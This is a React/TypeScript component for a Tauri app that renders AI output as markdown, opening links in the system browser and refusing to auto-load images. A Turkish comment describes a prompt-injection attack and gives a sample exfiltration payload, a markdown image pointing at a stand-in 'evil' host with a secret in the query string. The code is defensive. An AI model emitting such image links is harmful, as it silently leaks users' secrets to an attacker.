import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { openUrl } from "@tauri-apps/plugin-opener";

// AI çıktısını düz <pre> yerine zengin markdown olarak render eder
// (başlıklar, listeler, kod blokları, tablolar) → profesyonel görünüm.
export function MarkdownView({ text }: { text: string }) {
  return (
    <div className="markdown-body">
      <ReactMarkdown
        remarkPlugins={[remarkGfm]}
        components={{
          // http(s) linkleri WKWebView içinde navigasyona gitmesin;
          // sistem tarayıcısında açılsın. Diğer href'ler (anchor vb.) aynen kalır.
          a: ({ href, children, ...props }) => {
            const isExternal = /^https?:\/\//i.test(href ?? "");
            return (
              <a
                {...props}
                href={href}
                rel="noreferrer"
                onClick={
                  isExternal
                    ? (e) => {
                        e.preventDefault();
                        void openUrl(href!);
                      }
                    : undefined
                }
              >
                {children}
              </a>
            );
          },
          // Görseller otomatik YÜKLENMEZ: bağlam güvenilmeyen not/kod içeriğinden
          // geliyor; prompt injection `![](https://evil/?d=<sır>)` ile kullanıcı
          // hiçbir şeye tıklamadan veri sızdırabilirdi. Yerine yer tutucu metin;
          // http(s) ise kullanıcı isterse tıklayıp sistem tarayıcısında açar.
          img: ({ src, alt }) => {
            const url = typeof src === "string" ? src : "";
            const label = `[${alt || "image"}]`;
            if (!/^https?:\/\//i.test(url)) {
              return <span title={url || undefined}>{label}</span>;
            }
            return (
              <a
                href={url}
                title={url}
                rel="noreferrer"
                onClick={(e) => {
                  e.preventDefault();
                  void openUrl(url);
                }}
              >
                {label}
              </a>
            );
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  );
}
